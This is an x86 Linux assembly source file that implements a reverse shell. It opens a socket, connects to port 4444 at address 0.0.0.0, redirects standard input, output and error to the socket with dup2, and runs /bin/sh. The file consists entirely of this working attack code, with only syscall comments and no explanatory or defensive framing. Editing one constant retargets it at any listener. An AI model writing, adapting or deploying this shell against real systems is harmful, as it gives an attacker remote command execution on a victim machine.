global _start

section .text

_start:

;socket(AF_INET, SOCK_STREAM, 0);
        mov eax,0x66
        mov ebx,0x1
        push 0x0
        push 0x1
        push 0x2
        mov ecx,esp
        int 0x80
        add esp,0xc
        mov dword [sockfd],eax
;connect(sockfd, (struct sockaddr *)&servSA_sin_family, sizeof servSA);
        mov eax,0x66
        mov ebx,0x3
        push 0x10
        push servSA_sin_family
        push dword [sockfd]
        mov ecx,esp
        int 0x80
        add esp,0xc

;dup2(sockfd,0)
        mov eax,0x3f
        mov ebx, dword [sockfd]
        mov ecx, 0x0
        int 0x80

        mov eax,0x3f
        mov ebx, dword [sockfd]
        mov ecx,0x1
        int 0x80

        mov eax,0x3f
        mov ebx, dword [sockfd]
        mov ecx, 0x2
        int 0x80

    mov eax,0xb
    mov ebx,exec_string
    mov ecx,exec_array
    mov edx,dword [exec_null]
    int 0x80

section .data
        sockfd: dd      0x00000000
        servSA_sin_family:      dw 0x0002 ; AF_INET
        servSA_sin_port:        dw 0x5c11 ; 4444 little endian
        servSA_sin_addr:        dd 0x00000000 ; INADDR_ANY
        servSA_sin_zero:        dd 0x00000000, 0x00000000

        exec_string: db "/bin/sh", 0x0
    exec_array: dd exec_string
    exec_null: dd 0x00000000
